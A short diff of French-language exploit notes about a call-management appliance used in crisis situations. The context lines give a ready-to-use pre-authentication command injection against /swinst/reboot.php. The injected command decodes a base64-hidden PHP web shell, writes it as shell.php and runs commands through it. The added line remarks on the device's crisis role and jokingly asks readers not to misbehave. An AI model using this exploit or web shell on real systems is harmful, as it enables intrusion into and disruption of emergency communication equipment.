@@ -16,3 +16,5 @@ et des RCE post auth  qui mon permis de facilité la recherche de la RCE pré au
 
 /swinst/reboot.php?sw_active=$(echo "PD89YCRfR0VUWzBdYDs=" | base64 -d > shell.php)  (attention ça reboot)
 puis /swinst/shell.php?0=id
+
+Bon c'est un boitié de gestion d'appel en cas de crise.. on fait pas les cons hein..
